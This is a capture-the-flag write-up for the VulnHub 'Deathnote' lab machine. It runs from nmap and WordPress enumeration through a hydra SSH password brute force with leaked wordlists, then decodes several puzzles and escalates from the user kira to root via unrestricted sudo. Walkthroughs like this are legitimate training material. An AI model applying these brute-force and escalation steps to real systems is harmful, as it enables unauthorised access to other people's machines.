# Deathnote (VulnHub)

target IP : `10.1.1.4`

## Enumeration

### Nmap Scan

```
nmap -A -p 80,22 10.1.1.4
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5e:b8:ff:2d:ac:c7:e9:3c:99:2f:3b:fc:da:5c:a3:53 (RSA)
|   256 a8:f3:81:9d:0a:dc:16:9a:49:ee:bc:24:e4:65:5c:a6 (ECDSA)
|_  256 4f:20:c3:2d:19:75:5b:e8:1f:32:01:75:c2:70:9a:7e (ED25519)

80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
```

![image](https://github.com/user-attachments/assets/af2d90dc-165c-4a81-840c-93f6450e75a4)


I think I should map the target IP to `/etc/hosts` as `deathnote.vuln`. The url to the website that showed the message is `deathnote.vuln/wordpress` i.e. It is a worpress site.

Now I can access the site. Great!

### Directory Enumeration

Too Exhaustive!

### Website Features

below image was found on `deathnote.vuln/wordpress/index.php/category/uncategorized/`

![image](https://github.com/user-attachments/assets/0d3658a4-cf13-4816-965f-e7c3245815bf)

![image](https://github.com/user-attachments/assets/de3fdf0d-fcac-40e9-be8f-211976762b4e)

![image](https://github.com/user-attachments/assets/799f462d-4ac6-4655-a2eb-f6e2bbbd0f7e)

---

`http://deathnote.vuln/wordpress/index.php/2021/07/19/kira/#comment-1` has several input vectors for leaving a comment. and has a comment `L` on kira.

![image](https://github.com/user-attachments/assets/c7fb09ba-279a-4ad9-a749-1086c7426494)

after sending a comment

![image](https://github.com/user-attachments/assets/7d9429b5-abd3-45ff-a16e-ab7d805b5186)

---

### HINTS Page

found an `hints` page on the server, says

```
Find a notes.txt file on server

or

SEE the L comment 
```

![image](https://github.com/user-attachments/assets/aea2181a-c84f-4227-a1dc-ce28cce2bfd2)

found directory listing for `http://deathnote.vuln/wp-content/uploads`

![image](https://github.com/user-attachments/assets/37cfe9f4-276b-4c5a-b281-1735b3422cc8)

found `notes.txt` and `user.txt` in `2021/07/`

![image](https://github.com/user-attachments/assets/93c0efa0-b8c1-4dcf-9baa-2f471c597ee5)

saw this on `robots.txt`

![image](https://github.com/user-attachments/assets/fc4c4665-784e-4999-ad1b-75f9a106668f)

tried accessing the `important.jpg`

![image](https://github.com/user-attachments/assets/ee18f5f6-b6fd-424b-b61f-3cdef3015093)

let's try `curl`

```bash
curl http://10.1.1.4/important.jpg   
```

```bash
i am Soichiro Yagami, light's father
i have a doubt if L is true about the assumption that light is kira

i can only help you by giving something important

login username : user.txt
i don't know the password.
find it by yourself 
but i think it is in the hint section of site
```

We know that **port 22 (SSH)** was open, so let's try it! cause I don't see any login vector anywhere else... :P

```bash
hydra -L user.txt -P notes.txt 10.1.1.4 ssh
```

```bash
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 731 login tries (l:17/p:43), ~46 tries per task
[DATA] attacking ssh://10.1.1.4:22/

[STATUS] 287.00 tries/min, 287 tries in 00:01h, 445 to do in 00:02h, 15 active
[22][ssh] host: 10.1.1.4   login: l   password: death4me

[STATUS] 278.00 tries/min, 556 tries in 00:02h, 176 to do in 00:01h, 15 active
1 of 1 target successfully completed, 1 valid password found
```

so, user : `l` and password : `death4me`

---

## PORT 22 ( SSH )

![image](https://github.com/user-attachments/assets/36399546-1159-4bfa-9f9d-e17ee4de1fde)

### Username Enumeration

two users found `kira` and `l` (obv)

### System Enumeration

```bash
l@deathnote:/opt/L/kira-case$ cat case-file.txt 
```

```bash
the FBI agent died on December 27, 2006

1 week after the investigation of the task-force member/head.
aka.....
Soichiro Yagami's family .


hmmmmmmmmm......
and according to watari ,
he died as other died after Kira targeted them .


and we also found something in 
fake-notebook-rule folder .
```

- will check the `fake-notebook-rule` later

---

I found misa user ig?

```bash
l@deathnote:/var$ cat misa
```

```
it is toooo late for misa 
```

---

#### Found HEX Value?

```bash
l@deathnote:/opt/L/fake-notebook-rule$ cat case.wav
```

```
63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
```

let's use `cyberchef` to decode this `hexadecimal` value

![image](https://github.com/user-attachments/assets/befb2726-b4d7-4e71-83c5-03368860cc99)

The hex value was decoded into `base64`

final password : `kiraisevil`

---

## Checking the fake-notebook-rule

```bash
l@deathnote:/opt/L/fake-notebook-rule$ cat hint
use cyberchef
```

I would probably have to decode this :

```bash
l@deathnote:~$ cat user.txt 
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>+++++++++++.------------.+.+++++.---.<<.>>++++++++++.<<.>>--------------.++++++++.+++++.<<.>>.------------.---.<<.>>++++++++++++++.-----------.---.+++++++..<<.++++++++++++.------------.>>----------.+++++++++++++++++++.-.<<.>>+++++.----------.++++++.<<.>>++.--------.-.++++++.<<.>>------------------.+++.<<.>>----.+.++++++++++.-------.<<.>>+++++++++++++++.-----.<<.>>----.--.+++..<<.>>+.--------.<<.+++++++++++++.>>++++++.--.+++++++++.-----------------.I asked `duck.ai` to find the type of encoding 
```

---

I asked `duck.ai` to find the type of encoding

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>+++++++++++.------------.+.+++++.---.<<.>>++++++++++.<<.>>--------------.++++++++.+++++.<<.>>.------------.---.<<.>>++++++++++++++.-----------.---.+++++++..<<.++++++++++++.------------.>>----------.+++++++++++++++++++.-.<<.>>+++++.----------.++++++.<<.>>++.--------.-.++++++.<<.>>------------------.+++.<<.>>----.+.++++++++++.-------.<<.>>+++++++++++++++.-----.<<.>>----.--.+++..<<.>>+.--------.<<.+++++++++++++.>>++++++.--.+++++++++.-----------------.

identify the type of encoding
```

![image](https://github.com/user-attachments/assets/afe86a02-822b-4c41-b332-4d5b7ab1193b)

so I opened I `brainfuck decoder` [Brainfuck Language - Online Decoder, Translator, Interpreter](https://www.dcode.fr/brainfuck-language) and the decoded string is

```
i think u got the shell , but you wont be able to kill me -kira
```

---

## Switching User to Kira

```
username : kira
password : kiraisevil
```

![image](https://github.com/user-attachments/assets/ab6bdd2d-5b33-4ae5-8804-9719d16500e1)

found `kira.txt`

```bash
kira@deathnote:~$ cat kira.txt
cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp
```

decoding from `base64` we get

```
please protect one of the following 
1. L (/opt)
2. Misa (/var)
```

we noted above that `misa` can't be saved so guess we just have `L`

---

### Kira Enumeration

checking the permissions

```bash
kira@deathnote:/$ sudo -l
```

```bash
[sudo] password for kira: 
Matching Defaults entries for kira on deathnote:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kira may run the following commands on deathnote:
    (ALL : ALL) ALL
```

switching to `root` user and getting into the `root` directory

```bash
sudo /bin/bash
cd root
```

found `root.txt`

```bash
cat root.txt
```

```bash
      ::::::::       ::::::::       ::::    :::       ::::::::       :::::::::           :::    :::::::::::       :::::::: 
    :+:    :+:     :+:    :+:      :+:+:   :+:      :+:    :+:      :+:    :+:        :+: :+:      :+:          :+:    :+: 
   +:+            +:+    +:+      :+:+:+  +:+      +:+             +:+    +:+       +:+   +:+     +:+          +:+         
  +#+            +#+    +:+      +#+ +:+ +#+      :#:             +#++:++#:       +#++:++#++:    +#+          +#++:++#++   
 +#+            +#+    +#+      +#+  +#+#+#      +#+   +#+#      +#+    +#+      +#+     +#+    +#+                 +#+    
#+#    #+#     #+#    #+#      #+#   #+#+#      #+#    #+#      #+#    #+#      #+#     #+#    #+#          #+#    #+#     
########       ########       ###    ####       ########       ###    ###      ###     ###    ###           ########       

##########follow me on twitter###########3
and share this screen shot and tag @KDSAMF
```
